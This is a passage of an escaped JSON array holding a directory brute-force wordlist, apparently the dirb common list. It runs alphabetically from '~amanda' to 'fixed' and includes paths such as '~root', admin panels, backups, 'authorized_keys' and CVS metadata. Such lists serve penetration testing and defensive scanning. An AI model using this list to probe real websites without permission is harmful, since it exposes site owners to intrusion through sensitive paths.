\"~amanda\",\n      \"~apache\",\n      \"~bin\",\n      \"~ftp\",\n      \"~guest\",\n      \"~http\",\n      \"~httpd\",\n      \"~log\",\n      \"~logs\",\n      \"~lp\",\n      \"~mail\",\n      \"~nobody\",\n      \"~operator\",\n      \"~root\",\n      \"~sys\",\n      \"~sysadm\",\n      \"~sysadmin\",\n      \"~test\",\n      \"~tmp\",\n      \"~user\",\n      \"~webmaster\",\n      \"~www\",\n      \"0\",\n      \"00\",\n      \"01\",\n      \"02\",\n      \"03\",\n      \"04\",\n      \"05\",\n      \"06\",\n      \"07\",\n      \"08\",\n      \"09\",\n      \"1\",\n      \"10\",\n      \"100\",\n      \"1000\",\n      \"1001\",\n      \"101\",\n      \"102\",\n      \"103\",\n      \"11\",\n      \"12\",\n      \"123\",\n      \"13\",\n      \"14\",\n      \"15\",\n      \"1990\",\n      \"1991\",\n      \"1992\",\n      \"1993\",\n      \"1994\",\n      \"1995\",\n      \"1996\",\n      \"1997\",\n      \"1998\",\n      \"1999\",\n      \"1x1\",\n      \"2\",\n      \"20\",\n      \"200\",\n      \"2000\",\n      \"2001\",\n      \"2002\",\n      \"2003\",\n      \"2004\",\n      \"2005\",\n      \"2006\",\n      \"2007\",\n      \"2008\",\n      \"2009\",\n      \"2010\",\n      \"2011\",\n      \"2012\",\n      \"2013\",\n      \"2014\",\n      \"21\",\n      \"22\",\n      \"2257\",\n      \"23\",\n      \"24\",\n      \"25\",\n      \"2g\",\n      \"3\",\n      \"30\",\n      \"300\",\n      \"32\",\n      \"3g\",\n      \"3rdparty\",\n      \"4\",\n      \"400\",\n      \"401\",\n      \"403\",\n      \"404\",\n      \"42\",\n      \"5\",\n      \"50\",\n      \"500\",\n      \"51\",\n      \"6\",\n      \"64\",\n      \"7\",\n      \"7z\",\n      \"8\",\n      \"9\",\n      \"96\",\n      \"a\",\n      \"A\",\n      \"aa\",\n      \"aaa\",\n      \"abc\",\n      \"abc123\",\n      \"abcd\",\n      \"abcd1234\",\n      \"about\",\n      \"About\",\n      \"about_us\",\n      \"aboutus\",\n      \"about-us\",\n      \"AboutUs\",\n      \"abstract\",\n      \"abuse\",\n      \"ac\",\n      \"academic\",\n      \"academics\",\n      \"acatalog\",\n      \"acc\",\n      \"access\",\n      \"access.1\",\n      \"access_db\",\n      \"access_log\",\n      \"access_log.1\",\n      \"accessgranted\",\n      \"accessibility\",\n      \"access-log\",\n      \"access-log.1\",\n      \"accessories\",\n      \"accommodation\",\n      \"account\",\n      \"account_edit\",\n      \"account_history\",\n      \"accountants\",\n      \"accounting\",\n      \"accounts\",\n      \"accountsettings\",\n      \"acct_login\",\n      \"achitecture\",\n      \"acp\",\n      \"act\",\n      \"action\",\n      \"actions\",\n      \"activate\",\n      \"active\",\n      \"activeCollab\",\n      \"activex\",\n      \"activities\",\n      \"activity\",\n      \"ad\",\n      \"ad_js\",\n      \"adaptive\",\n      \"adclick\",\n      \"add\",\n      \"add_cart\",\n      \"addfav\",\n      \"addnews\",\n      \"addons\",\n      \"addpost\",\n      \"addreply\",\n      \"address\",\n      \"address_book\",\n      \"addressbook\",\n      \"addresses\",\n      \"addtocart\",\n      \"adlog\",\n      \"adlogger\",\n      \"adm\",\n      \"ADM\",\n      \"admin\",\n      \"Admin\",\n      \"ADMIN\",\n      \"admin.cgi\",\n      \"admin.php\",\n      \"admin.pl\",\n      \"admin_\",\n      \"admin_area\",\n      \"admin_banner\",\n      \"admin_c\",\n      \"admin_index\",\n      \"admin_interface\",\n      \"admin_login\",\n      \"admin_logon\",\n      \"admin1\",\n      \"admin2\",\n      \"admin3\",\n      \"admin4_account\",\n      \"admin4_colon\",\n      \"admin-admin\",\n      \"admin-console\",\n      \"admincontrol\",\n      \"admincp\",\n      \"adminhelp\",\n      \"admin-interface\",\n      \"administer\",\n      \"administr8\",\n      \"administracion\",\n      \"administrador\",\n      \"administrat\",\n      \"administratie\",\n      \"administration\",\n      \"Administration\",\n      \"administrator\",\n      \"administratoraccounts\",\n      \"administrators\",\n      \"administrivia\",\n      \"adminlogin\",\n      \"adminlogon\",\n      \"adminpanel\",\n      \"adminpro\",\n      \"admins\",\n      \"AdminService\",\n      \"adminsessions\",\n      \"adminsql\",\n      \"admintools\",\n      \"AdminTools\",\n      \"admissions\",\n      \"admon\",\n      \"ADMON\",\n      \"adobe\",\n      \"adodb\",\n      \"ads\",\n      \"adserver\",\n      \"adsl\",\n      \"adv\",\n      \"adv_counter\",\n      \"advanced\",\n      \"advanced_search\",\n      \"advancedsearch\",\n      \"advert\",\n      \"advertise\",\n      \"advertisement\",\n      \"advertisers\",\n      \"advertising\",\n      \"adverts\",\n      \"advice\",\n      \"adview\",\n      \"advisories\",\n      \"af\",\n      \"aff\",\n      \"affiche\",\n      \"affiliate\",\n      \"affiliate_info\",\n      \"affiliate_terms\",\n      \"affiliates\",\n      \"affiliatewiz\",\n      \"africa\",\n      \"agb\",\n      \"agency\",\n      \"agenda\",\n      \"agent\",\n      \"agents\",\n      \"aggregator\",\n      \"AggreSpy\",\n      \"ajax\",\n      \"ajax_cron\",\n      \"akamai\",\n      \"akeeba.backend.log\",\n      \"alarm\",\n      \"alarms\",\n      \"album\",\n      \"albums\",\n      \"alcatel\",\n      \"alert\",\n      \"alerts\",\n      \"alias\",\n      \"aliases\",\n      \"all\",\n      \"alltime\",\n      \"all-wcprops\",\n      \"alpha\",\n      \"alt\",\n      \"alumni\",\n      \"alumni_add\",\n      \"alumni_details\",\n      \"alumni_info\",\n      \"alumni_reunions\",\n      \"alumni_update\",\n      \"am\",\n      \"amanda\",\n      \"amazon\",\n      \"amember\",\n      \"analog\",\n      \"analyse\",\n      \"analysis\",\n      \"analytics\",\n      \"and\",\n      \"android\",\n      \"announce\",\n      \"announcement\",\n      \"announcements\",\n      \"annuaire\",\n      \"annual\",\n      \"anon\",\n      \"anon_ftp\",\n      \"anonymous\",\n      \"ansi\",\n      \"answer\",\n      \"answers\",\n      \"antibot_image\",\n      \"antispam\",\n      \"antivirus\",\n      \"anuncios\",\n      \"any\",\n      \"aol\",\n      \"ap\",\n      \"apac\",\n      \"apache\",\n      \"apanel\",\n      \"apc\",\n      \"apexec\",\n      \"api\",\n      \"apis\",\n      \"apl\",\n      \"apm\",\n      \"app\",\n      \"app_browser\",\n      \"app_browsers\",\n      \"app_code\",\n      \"app_data\",\n      \"app_themes\",\n      \"appeal\",\n      \"appeals\",\n      \"append\",\n      \"appl\",\n      \"apple\",\n      \"applet\",\n      \"applets\",\n      \"appliance\",\n      \"appliation\",\n      \"application\",\n      \"application.wadl\",\n      \"applications\",\n      \"apply\",\n      \"apps\",\n      \"AppsLocalLogin\",\n      \"AppsLogin\",\n      \"apr\",\n      \"ar\",\n      \"arbeit\",\n      \"arcade\",\n      \"arch\",\n      \"architect\",\n      \"architecture\",\n      \"archiv\",\n      \"archive\",\n      \"Archive\",\n      \"archives\",\n      \"archivos\",\n      \"arquivos\",\n      \"array\",\n      \"arrow\",\n      \"ars\",\n      \"art\",\n      \"article\",\n      \"articles\",\n      \"Articles\",\n      \"artikel\",\n      \"artists\",\n      \"arts\",\n      \"artwork\",\n      \"as\",\n      \"ascii\",\n      \"asdf\",\n      \"ashley\",\n      \"asia\",\n      \"ask\",\n      \"ask_a_question\",\n      \"askapache\",\n      \"asmx\",\n      \"asp\",\n      \"aspadmin\",\n      \"aspdnsfcommon\",\n      \"aspdnsfencrypt\",\n      \"aspdnsfgateways\",\n      \"aspdnsfpatterns\",\n      \"aspnet_client\",\n      \"asps\",\n      \"aspx\",\n      \"asset\",\n      \"assetmanage\",\n      \"assetmanagement\",\n      \"assets\",\n      \"at\",\n      \"AT-admin.cgi\",\n      \"atom\",\n      \"attach\",\n      \"attach_mod\",\n      \"attachment\",\n      \"attachments\",\n      \"attachs\",\n      \"attic\",\n      \"au\",\n      \"auction\",\n      \"auctions\",\n      \"audio\",\n      \"audit\",\n      \"audits\",\n      \"auth\",\n      \"authentication\",\n      \"author\",\n      \"authoring\",\n      \"authorization\",\n      \"authorized_keys\",\n      \"authors\",\n      \"authuser\",\n      \"authusers\",\n      \"auto\",\n      \"autobackup\",\n      \"autocheck\",\n      \"autodeploy\",\n      \"autodiscover\",\n      \"autologin\",\n      \"automatic\",\n      \"automation\",\n      \"automotive\",\n      \"aux\",\n      \"av\",\n      \"avatar\",\n      \"avatars\",\n      \"aw\",\n      \"award\",\n      \"awardingbodies\",\n      \"awards\",\n      \"awl\",\n      \"awmdata\",\n      \"awstats\",\n      \"awstats.conf\",\n      \"axis\",\n      \"axis2\",\n      \"axis2-admin\",\n      \"axis-admin\",\n      \"axs\",\n      \"az\",\n      \"b\",\n      \"B\",\n      \"b1\",\n      \"b2b\",\n      \"b2c\",\n      \"back\",\n      \"backdoor\",\n      \"backend\",\n      \"background\",\n      \"backgrounds\",\n      \"backoffice\",\n      \"BackOffice\",\n      \"backup\",\n      \"back-up\",\n      \"backup_migrate\",\n      \"backup2\",\n      \"backup-db\",\n      \"backups\",\n      \"bad_link\",\n      \"bak\",\n      \"bakup\",\n      \"bak-up\",\n      \"balance\",\n      \"balances\",\n      \"ban\",\n      \"bandwidth\",\n      \"bank\",\n      \"banking\",\n      \"banks\",\n      \"banned\",\n      \"banner\",\n      \"banner_element\",\n      \"banner2\",\n      \"banneradmin\",\n      \"bannerads\",\n      \"banners\",\n      \"bar\",\n      \"base\",\n      \"Base\",\n      \"baseball\",\n      \"bash\",\n      \"basic\",\n      \"basket\",\n      \"basketball\",\n      \"baskets\",\n      \"bass\",\n      \"bat\",\n      \"batch\",\n      \"baz\",\n      \"bb\",\n      \"bbadmin\",\n      \"bbclone\",\n      \"bb-hist\",\n      \"bb-histlog\",\n      \"bboard\",\n      \"bbs\",\n      \"bc\",\n      \"bd\",\n      \"bdata\",\n      \"be\",\n      \"bea\",\n      \"bean\",\n      \"beans\",\n      \"beehive\",\n      \"beheer\",\n      \"benefits\",\n      \"benutzer\",\n      \"best\",\n      \"beta\",\n      \"bfc\",\n      \"bg\",\n      \"big\",\n      \"bigadmin\",\n      \"bigip\",\n      \"bilder\",\n      \"bill\",\n      \"billing\",\n      \"bin\",\n      \"binaries\",\n      \"binary\",\n      \"bins\",\n      \"bio\",\n      \"bios\",\n      \"bitrix\",\n      \"biz\",\n      \"bk\",\n      \"bkup\",\n      \"bl\",\n      \"black\",\n      \"blah\",\n      \"blank\",\n      \"blb\",\n      \"block\",\n      \"blocked\",\n      \"blocks\",\n      \"blog\",\n      \"Blog\",\n      \"blog_ajax\",\n      \"blog_inlinemod\",\n      \"blog_report\",\n      \"blog_search\",\n      \"blog_usercp\",\n      \"blogger\",\n      \"bloggers\",\n      \"blogindex\",\n      \"blogs\",\n      \"blogspot\",\n      \"blow\",\n      \"blue\",\n      \"bm\",\n      \"bmz_cache\",\n      \"bnnr\",\n      \"bo\",\n      \"board\",\n      \"boards\",\n      \"bob\",\n      \"body\",\n      \"bofh\",\n      \"boiler\",\n      \"boilerplate\",\n      \"bonus\",\n      \"bonuses\",\n      \"book\",\n      \"booker\",\n      \"booking\",\n      \"bookmark\",\n      \"bookmarks\",\n      \"books\",\n      \"Books\",\n      \"bookstore\",\n      \"boost_stats\",\n      \"boot\",\n      \"bot\",\n      \"bots\",\n      \"bottom\",\n      \"bot-trap\",\n      \"boutique\",\n      \"box\",\n      \"boxes\",\n      \"br\",\n      \"brand\",\n      \"brands\",\n      \"broadband\",\n      \"brochure\",\n      \"brochures\",\n      \"broken\",\n      \"broken_link\",\n      \"broker\",\n      \"browse\",\n      \"browser\",\n      \"Browser\",\n      \"bs\",\n      \"bsd\",\n      \"bt\",\n      \"bug\",\n      \"bugs\",\n      \"build\",\n      \"BUILD\",\n      \"builder\",\n      \"buildr\",\n      \"bulk\",\n      \"bulksms\",\n      \"bullet\",\n      \"busca\",\n      \"buscador\",\n      \"buscar\",\n      \"business\",\n      \"Business\",\n      \"button\",\n      \"buttons\",\n      \"buy\",\n      \"buynow\",\n      \"buyproduct\",\n      \"bypass\",\n      \"bz2\",\n      \"c\",\n      \"C\",\n      \"ca\",\n      \"cabinet\",\n      \"cache\",\n      \"cachemgr\",\n      \"cachemgr.cgi\",\n      \"caching\",\n      \"cad\",\n      \"cadmins\",\n      \"cal\",\n      \"calc\",\n      \"calendar\",\n      \"calendar_events\",\n      \"calendar_sports\",\n      \"calendarevents\",\n      \"calendars\",\n      \"calender\",\n      \"call\",\n      \"callback\",\n      \"callee\",\n      \"caller\",\n      \"callin\",\n      \"calling\",\n      \"callout\",\n      \"cam\",\n      \"camel\",\n      \"campaign\",\n      \"campaigns\",\n      \"can\",\n      \"canada\",\n      \"captcha\",\n      \"car\",\n      \"carbuyaction\",\n      \"card\",\n      \"cardinal\",\n      \"cardinalauth\",\n      \"cardinalform\",\n      \"cards\",\n      \"career\",\n      \"careers\",\n      \"carp\",\n      \"carpet\",\n      \"cars\",\n      \"cart\",\n      \"carthandler\",\n      \"carts\",\n      \"cas\",\n      \"cases\",\n      \"casestudies\",\n      \"cash\",\n      \"cat\",\n      \"catalog\",\n      \"catalog.wci\",\n      \"catalogs\",\n      \"catalogsearch\",\n      \"catalogue\",\n      \"catalyst\",\n      \"catch\",\n      \"categoria\",\n      \"categories\",\n      \"category\",\n      \"catinfo\",\n      \"cats\",\n      \"cb\",\n      \"cc\",\n      \"ccbill\",\n      \"ccount\",\n      \"ccp14admin\",\n      \"ccs\",\n      \"cd\",\n      \"cdrom\",\n      \"centres\",\n      \"cert\",\n      \"certenroll\",\n      \"certificate\",\n      \"certificates\",\n      \"certification\",\n      \"certified\",\n      \"certs\",\n      \"certserver\",\n      \"certsrv\",\n      \"cf\",\n      \"cfc\",\n      \"cfcache\",\n      \"cfdocs\",\n      \"cfg\",\n      \"cfide\",\n      \"cfm\",\n      \"cfusion\",\n      \"cgi\",\n      \"cgi_bin\",\n      \"cgibin\",\n      \"cgi-bin\",\n      \"cgi-bin/\",\n      \"cgi-bin2\",\n      \"cgi-data\",\n      \"cgi-exe\",\n      \"cgi-home\",\n      \"cgi-image\",\n      \"cgi-local\",\n      \"cgi-perl\",\n      \"cgi-pub\",\n      \"cgis\",\n      \"cgi-script\",\n      \"cgi-shl\",\n      \"cgi-sys\",\n      \"cgi-web\",\n      \"cgi-win\",\n      \"cgiwrap\",\n      \"cgm-web\",\n      \"ch\",\n      \"chan\",\n      \"change\",\n      \"change_password\",\n      \"changed\",\n      \"changelog\",\n      \"ChangeLog\",\n      \"changepassword\",\n      \"changepw\",\n      \"changepwd\",\n      \"changes\",\n      \"channel\",\n      \"charge\",\n      \"charges\",\n      \"chart\",\n      \"charts\",\n      \"chat\",\n      \"chats\",\n      \"check\",\n      \"checking\",\n      \"checkout\",\n      \"checkout_iclear\",\n      \"checkoutanon\",\n      \"checkoutreview\",\n      \"checkpoint\",\n      \"checks\",\n      \"child\",\n      \"children\",\n      \"china\",\n      \"chk\",\n      \"choosing\",\n      \"chpasswd\",\n      \"chpwd\",\n      \"chris\",\n      \"chrome\",\n      \"cinema\",\n      \"cisco\",\n      \"cisweb\",\n      \"cities\",\n      \"citrix\",\n      \"city\",\n      \"ck\",\n      \"ckeditor\",\n      \"ckfinder\",\n      \"cl\",\n      \"claim\",\n      \"claims\",\n      \"class\",\n      \"classes\",\n      \"classic\",\n      \"classified\",\n      \"classifieds\",\n      \"classroompages\",\n      \"cleanup\",\n      \"clear\",\n      \"clearcookies\",\n      \"clearpixel\",\n      \"click\",\n      \"clickheat\",\n      \"clickout\",\n      \"clicks\",\n      \"client\",\n      \"clientaccesspolicy\",\n      \"clientapi\",\n      \"clientes\",\n      \"clients\",\n      \"clientscript\",\n      \"clipart\",\n      \"clips\",\n      \"clk\",\n      \"clock\",\n      \"close\",\n      \"closed\",\n      \"closing\",\n      \"club\",\n      \"cluster\",\n      \"clusters\",\n      \"cm\",\n      \"cmd\",\n      \"cmpi_popup\",\n      \"cms\",\n      \"CMS\",\n      \"cmsadmin\",\n      \"cn\",\n      \"cnf\",\n      \"cnstats\",\n      \"cnt\",\n      \"co\",\n      \"cocoon\",\n      \"code\",\n      \"codec\",\n      \"codecs\",\n      \"codepages\",\n      \"codes\",\n      \"coffee\",\n      \"cognos\",\n      \"coke\",\n      \"coldfusion\",\n      \"collapse\",\n      \"collection\",\n      \"college\",\n      \"columnists\",\n      \"columns\",\n      \"com\",\n      \"com_sun_web_ui\",\n      \"com1\",\n      \"com2\",\n      \"com3\",\n      \"comics\",\n      \"comm\",\n      \"command\",\n      \"comment\",\n      \"commentary\",\n      \"commented\",\n      \"comment-page\",\n      \"comment-page-1\",\n      \"comments\",\n      \"commerce\",\n      \"commercial\",\n      \"common\",\n      \"commoncontrols\",\n      \"commun\",\n      \"communication\",\n      \"communications\",\n      \"communicator\",\n      \"communities\",\n      \"community\",\n      \"comp\",\n      \"compact\",\n      \"companies\",\n      \"company\",\n      \"compare\",\n      \"compare_product\",\n      \"comparison\",\n      \"comparison_list\",\n      \"compat\",\n      \"compiled\",\n      \"complaint\",\n      \"complaints\",\n      \"compliance\",\n      \"component\",\n      \"components\",\n      \"compose\",\n      \"composer\",\n      \"compress\",\n      \"compressed\",\n      \"computer\",\n      \"computers\",\n      \"Computers\",\n      \"computing\",\n      \"comunicator\",\n      \"con\",\n      \"concrete\",\n      \"conditions\",\n      \"conf\",\n      \"conference\",\n      \"conferences\",\n      \"config\",\n      \"config.local\",\n      \"configs\",\n      \"configuration\",\n      \"configure\",\n      \"confirm\",\n      \"confirmed\",\n      \"conlib\",\n      \"conn\",\n      \"connect\",\n      \"connections\",\n      \"connector\",\n      \"connectors\",\n      \"console\",\n      \"constant\",\n      \"constants\",\n      \"consulting\",\n      \"consumer\",\n      \"cont\",\n      \"contact\",\n      \"Contact\",\n      \"contact_bean\",\n      \"contact_us\",\n      \"contact-form\",\n      \"contactinfo\",\n      \"contacto\",\n      \"contacts\",\n      \"contactus\",\n      \"contact-us\",\n      \"ContactUs\",\n      \"contao\",\n      \"contato\",\n      \"contenido\",\n      \"content\",\n      \"Content\",\n      \"contents\",\n      \"contest\",\n      \"contests\",\n      \"contract\",\n      \"contracts\",\n      \"contrib\",\n      \"contribute\",\n      \"contributor\",\n      \"control\",\n      \"controller\",\n      \"controllers\",\n      \"controlpanel\",\n      \"controls\",\n      \"converge_local\",\n      \"converse\",\n      \"cookie\",\n      \"cookie_usage\",\n      \"cookies\",\n      \"cool\",\n      \"copies\",\n      \"copy\",\n      \"copyright\",\n      \"copyright-policy\",\n      \"corba\",\n      \"core\",\n      \"coreg\",\n      \"corp\",\n      \"corpo\",\n      \"corporate\",\n      \"corporation\",\n      \"corrections\",\n      \"count\",\n      \"counter\",\n      \"counters\",\n      \"country\",\n      \"counts\",\n      \"coupon\",\n      \"coupons\",\n      \"coupons1\",\n      \"course\",\n      \"courses\",\n      \"cover\",\n      \"covers\",\n      \"cp\",\n      \"cpadmin\",\n      \"CPAN\",\n      \"cpanel\",\n      \"cPanel\",\n      \"cpanel_file\",\n      \"cpath\",\n      \"cpp\",\n      \"cps\",\n      \"cpstyles\",\n      \"cpw\",\n      \"cr\",\n      \"crack\",\n      \"crash\",\n      \"crashes\",\n      \"create\",\n      \"create_account\",\n      \"createaccount\",\n      \"createbutton\",\n      \"creation\",\n      \"Creatives\",\n      \"creator\",\n      \"credit\",\n      \"creditcards\",\n      \"credits\",\n      \"crime\",\n      \"crm\",\n      \"crms\",\n      \"cron\",\n      \"cronjobs\",\n      \"crons\",\n      \"crontab\",\n      \"crontabs\",\n      \"crossdomain\",\n      \"crossdomain.xml\",\n      \"crs\",\n      \"crtr\",\n      \"crypt\",\n      \"crypto\",\n      \"cs\",\n      \"cse\",\n      \"csproj\",\n      \"css\",\n      \"csv\",\n      \"ct\",\n      \"ctl\",\n      \"culture\",\n      \"currency\",\n      \"current\",\n      \"custom\",\n      \"custom_log\",\n      \"customavatars\",\n      \"customcode\",\n      \"customer\",\n      \"customer_login\",\n      \"customers\",\n      \"customgroupicons\",\n      \"customize\",\n      \"custom-log\",\n      \"cute\",\n      \"cutesoft_client\",\n      \"cv\",\n      \"cvs\",\n      \"CVS\",\n      \"CVS/Entries\",\n      \"CVS/Repository\",\n      \"CVS/Root\",\n      \"cxf\",\n      \"cy\",\n      \"CYBERDOCS\",\n      \"CYBERDOCS25\",\n      \"CYBERDOCS31\",\n      \"cyberworld\",\n      \"cycle_image\",\n      \"cz\",\n      \"czcmdcvt\",\n      \"d\",\n      \"D\",\n      \"da\",\n      \"daemon\",\n      \"daily\",\n      \"dan\",\n      \"dana-na\",\n      \"dark\",\n      \"dashboard\",\n      \"dat\",\n      \"data\",\n      \"database\",\n      \"database_administration\",\n      \"Database_Administration\",\n      \"databases\",\n      \"datafiles\",\n      \"datas\",\n      \"date\",\n      \"daten\",\n      \"datenschutz\",\n      \"dating\",\n      \"dav\",\n      \"day\",\n      \"db\",\n      \"DB\",\n      \"db_connect\",\n      \"dba\",\n      \"dbadmin\",\n      \"dbase\",\n      \"dbboon\",\n      \"dbg\",\n      \"dbi\",\n      \"dblclk\",\n      \"dbm\",\n      \"dbman\",\n      \"dbmodules\",\n      \"dbms\",\n      \"dbutil\",\n      \"dc\",\n      \"dcforum\",\n      \"dclk\",\n      \"de\",\n      \"de_DE\",\n      \"deal\",\n      \"dealer\",\n      \"dealers\",\n      \"deals\",\n      \"debian\",\n      \"debug\",\n      \"dec\",\n      \"decl\",\n      \"declaration\",\n      \"declarations\",\n      \"decode\",\n      \"decoder\",\n      \"decrypt\",\n      \"decrypted\",\n      \"decryption\",\n      \"def\",\n      \"default\",\n      \"Default\",\n      \"default_icon\",\n      \"default_image\",\n      \"default_logo\",\n      \"default_page\",\n      \"default_pages\",\n      \"defaults\",\n      \"definition\",\n      \"definitions\",\n      \"del\",\n      \"delete\",\n      \"deleted\",\n      \"deleteme\",\n      \"deletion\",\n      \"delicious\",\n      \"demo\",\n      \"demo2\",\n      \"demos\",\n      \"denied\",\n      \"deny\",\n      \"departments\",\n      \"deploy\",\n      \"deployment\",\n      \"descargas\",\n      \"design\",\n      \"designs\",\n      \"desktop\",\n      \"desktopmodules\",\n      \"desktops\",\n      \"destinations\",\n      \"detail\",\n      \"details\",\n      \"deutsch\",\n      \"dev\",\n      \"dev2\",\n      \"dev60cgi\",\n      \"devel\",\n      \"develop\",\n      \"developement\",\n      \"developer\",\n      \"developers\",\n      \"development\",\n      \"development.log\",\n      \"device\",\n      \"devices\",\n      \"devs\",\n      \"devtools\",\n      \"df\",\n      \"dh_\",\n      \"dh_phpmyadmin\",\n      \"di\",\n      \"diag\",\n      \"diagnostics\",\n      \"dial\",\n      \"dialog\",\n      \"dialogs\",\n      \"diary\",\n      \"dictionary\",\n      \"diff\",\n      \"diffs\",\n      \"dig\",\n      \"digest\",\n      \"digg\",\n      \"digital\",\n      \"dir\",\n      \"dirb\",\n      \"dirbmark\",\n      \"direct\",\n      \"directadmin\",\n      \"directions\",\n      \"directories\",\n      \"directorio\",\n      \"directory\",\n      \"dir-login\",\n      \"dir-prop-base\",\n      \"dirs\",\n      \"disabled\",\n      \"disallow\",\n      \"disclaimer\",\n      \"disclosure\",\n      \"discootra\",\n      \"discount\",\n      \"discovery\",\n      \"discus\",\n      \"discuss\",\n      \"discussion\",\n      \"disdls\",\n      \"disk\",\n      \"dispatch\",\n      \"dispatcher\",\n      \"display\",\n      \"display_vvcodes\",\n      \"dist\",\n      \"divider\",\n      \"django\",\n      \"dk\",\n      \"dl\",\n      \"dll\",\n      \"dm\",\n      \"dm-config\",\n      \"dmdocuments\",\n      \"dms\",\n      \"DMSDump\",\n      \"dns\",\n      \"do\",\n      \"doc\",\n      \"docebo\",\n      \"docedit\",\n      \"dock\",\n      \"docnote\",\n      \"docroot\",\n      \"docs\",\n      \"docs41\",\n      \"docs51\",\n      \"document\",\n      \"document_library\",\n      \"documentation\",\n      \"documents\",\n      \"Documents and Settings\",\n      \"doinfo\",\n      \"doit\",\n      \"dokuwiki\",\n      \"dologin\",\n      \"domain\",\n      \"domains\",\n      \"donate\",\n      \"donations\",\n      \"done\",\n      \"dot\",\n      \"double\",\n      \"doubleclick\",\n      \"down\",\n      \"download\",\n      \"Download\",\n      \"download_private\",\n      \"downloader\",\n      \"downloads\",\n      \"Downloads\",\n      \"downsys\",\n      \"draft\",\n      \"drafts\",\n      \"dragon\",\n      \"draver\",\n      \"driver\",\n      \"drivers\",\n      \"drop\",\n      \"dropped\",\n      \"drupal\",\n      \"ds\",\n      \"dummy\",\n      \"dump\",\n      \"dumpenv\",\n      \"dumps\",\n      \"dumpuser\",\n      \"dvd\",\n      \"dwr\",\n      \"dyn\",\n      \"dynamic\",\n      \"dyop_addtocart\",\n      \"dyop_delete\",\n      \"dyop_quan\",\n      \"e\",\n      \"E\",\n      \"e107_admin\",\n      \"e107_files\",\n      \"e107_handlers\",\n      \"e2fs\",\n      \"ear\",\n      \"easy\",\n      \"ebay\",\n      \"eblast\",\n      \"ebook\",\n      \"ebooks\",\n      \"ebriefs\",\n      \"ec\",\n      \"ecard\",\n      \"ecards\",\n      \"echannel\",\n      \"ecommerce\",\n      \"ecrire\",\n      \"edge\",\n      \"edgy\",\n      \"edit\",\n      \"edit_link\",\n      \"edit_profile\",\n      \"editaddress\",\n      \"editor\",\n      \"editorial\",\n      \"editorials\",\n      \"editors\",\n      \"editpost\",\n      \"edits\",\n      \"edp\",\n      \"edu\",\n      \"education\",\n      \"Education\",\n      \"ee\",\n      \"effort\",\n      \"efforts\",\n      \"egress\",\n      \"ehdaa\",\n      \"ejb\",\n      \"el\",\n      \"electronics\",\n      \"element\",\n      \"elements\",\n      \"elmar\",\n      \"em\",\n      \"email\",\n      \"e-mail\",\n      \"email-addresses\",\n      \"emailafriend\",\n      \"email-a-friend\",\n      \"emailer\",\n      \"emailhandler\",\n      \"emailing\",\n      \"emailproduct\",\n      \"emails\",\n      \"emailsignup\",\n      \"emailtemplates\",\n      \"embed\",\n      \"embedd\",\n      \"embedded\",\n      \"emea\",\n      \"emergency\",\n      \"emoticons\",\n      \"employee\",\n      \"employees\",\n      \"employers\",\n      \"employment\",\n      \"empty\",\n      \"emu\",\n      \"emulator\",\n      \"en\",\n      \"en_us\",\n      \"en_US\",\n      \"enable-cookies\",\n      \"enc\",\n      \"encode\",\n      \"encoder\",\n      \"encrypt\",\n      \"encrypted\",\n      \"encryption\",\n      \"encyption\",\n      \"end\",\n      \"enduser\",\n      \"endusers\",\n      \"energy\",\n      \"enews\",\n      \"eng\",\n      \"engine\",\n      \"engines\",\n      \"english\",\n      \"English\",\n      \"enterprise\",\n      \"entertainment\",\n      \"Entertainment\",\n      \"entries\",\n      \"Entries\",\n      \"entropybanner\",\n      \"entry\",\n      \"env\",\n      \"environ\",\n      \"environment\",\n      \"ep\",\n      \"eproducts\",\n      \"equipment\",\n      \"eric\",\n      \"err\",\n      \"erraddsave\",\n      \"errata\",\n      \"error\",\n      \"error_docs\",\n      \"error_log\",\n      \"error_message\",\n      \"error_pages\",\n      \"error404\",\n      \"errordocs\",\n      \"error-espanol\",\n      \"error-log\",\n      \"errorpage\",\n      \"errorpages\",\n      \"errors\",\n      \"erros\",\n      \"es\",\n      \"es_ES\",\n      \"esale\",\n      \"esales\",\n      \"eshop\",\n      \"esp\",\n      \"espanol\",\n      \"established\",\n      \"estilos\",\n      \"estore\",\n      \"e-store\",\n      \"esupport\",\n      \"et\",\n      \"etc\",\n      \"ethics\",\n      \"eu\",\n      \"europe\",\n      \"evb\",\n      \"event\",\n      \"events\",\n      \"Events\",\n      \"evil\",\n      \"evt\",\n      \"ewebeditor\",\n      \"ews\",\n      \"ex\",\n      \"example\",\n      \"examples\",\n      \"excalibur\",\n      \"excel\",\n      \"exception_log\",\n      \"exch\",\n      \"exchange\",\n      \"exchweb\",\n      \"exclude\",\n      \"exe\",\n      \"exec\",\n      \"executable\",\n      \"executables\",\n      \"exiar\",\n      \"exit\",\n      \"expert\",\n      \"experts\",\n      \"exploits\",\n      \"explore\",\n      \"explorer\",\n      \"export\",\n      \"exports\",\n      \"ext\",\n      \"ext2\",\n      \"extension\",\n      \"extensions\",\n      \"extern\",\n      \"external\",\n      \"externalid\",\n      \"externalisation\",\n      \"externalization\",\n      \"extra\",\n      \"extranet\",\n      \"Extranet\",\n      \"extras\",\n      \"ez\",\n      \"ezshopper\",\n      \"ezsqliteadmin\",\n      \"f\",\n      \"F\",\n      \"fa\",\n      \"fabric\",\n      \"face\",\n      \"facebook\",\n      \"faces\",\n      \"facts\",\n      \"faculty\",\n      \"fail\",\n      \"failed\",\n      \"failure\",\n      \"fake\",\n      \"family\",\n      \"fancybox\",\n      \"faq\",\n      \"FAQ\",\n      \"faqs\",\n      \"fashion\",\n      \"favicon.ico\",\n      \"favorite\",\n      \"favorites\",\n      \"fb\",\n      \"fbook\",\n      \"fc\",\n      \"fcategory\",\n      \"fcgi\",\n      \"fcgi-bin\",\n      \"fck\",\n      \"fckeditor\",\n      \"FCKeditor\",\n      \"fdcp\",\n      \"feature\",\n      \"featured\",\n      \"features\",\n      \"fedora\",\n      \"feed\",\n      \"feedback\",\n      \"feedback_js\",\n      \"feeds\",\n      \"felix\",\n      \"fetch\",\n      \"fi\",\n      \"field\",\n      \"fields\",\n      \"file\",\n      \"fileadmin\",\n      \"filelist\",\n      \"filemanager\",\n      \"files\",\n      \"filesystem\",\n      \"fileupload\",\n      \"fileuploads\",\n      \"filez\",\n      \"film\",\n      \"films\",\n      \"filter\",\n      \"finance\",\n      \"financial\",\n      \"find\",\n      \"finger\",\n      \"finishorder\",\n      \"firefox\",\n      \"firewall\",\n      \"firewalls\",\n      \"firmconnect\",\n      \"firms\",\n      \"firmware\",\n      \"first\",\n      \"fixed\",\n      